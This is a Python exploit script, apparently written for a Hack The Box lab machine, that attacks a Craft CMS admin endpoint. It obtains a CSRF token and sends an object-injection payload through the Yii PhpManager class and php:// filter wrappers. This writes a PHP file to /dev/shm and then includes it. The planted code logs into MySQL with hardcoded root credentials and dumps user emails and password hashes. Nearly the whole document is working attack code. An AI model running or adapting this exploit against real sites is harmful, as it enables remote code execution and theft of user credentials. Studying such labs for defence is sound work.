import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    filt = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    # CSRF from initial response
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":filt}]}}}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=15)

# Write the PHP payload
php_code = '<?php while (ob_get_level() > 0) { ob_end_flush(); } echo str_repeat("X", 8192); try { $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!", [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]); $r = $db->query("SELECT id,username,email,password FROM users LIMIT 5")->fetchAll(PDO::FETCH_ASSOC); echo "USER_DATA:" . json_encode($r); } catch (Exception $e) { echo "DB_ERR:" . $e->getMessage(); } $arr = []; echo $arr[999]; ?>'
php_b64 = base64.b64encode(php_code.encode()).decode()
write_php = '<?php file_put_contents("/dev/shm/bp.php", base64_decode("' + php_b64 + '")); ?>'

print("[*] Step 1: Writing bp.php to /dev/shm/ ...")
r = inject_b64(write_php)
print(f"    Status: {r.status_code}, Len: {len(r.text)}")
time.sleep(1)

print("[*] Step 2: Including /dev/shm/bp.php ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/dev/shm/bp.php"}]}}}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

if 'USER_DATA' in t:
    print('[+] USER_DATA found!')
    print(t[t.index('USER_DATA'):t.index('USER_DATA')+1000])
elif 'DB_ERR' in t:
    print('[!] DB_ERR:')
    print(t[t.index('DB_ERR'):t.index('DB_ERR')+500])
elif 'XXXXXX' in t:
    print('[+] X markers found')
    i = t.index('XXXXXX')
    print(f'  at byte {i}: {t[max(0,i-20):i+100]}')
else:
    print('[-] No markers')
    print(f'First 300: {t[:300]}')
    print(f'Last 600: {t[-600:]}')
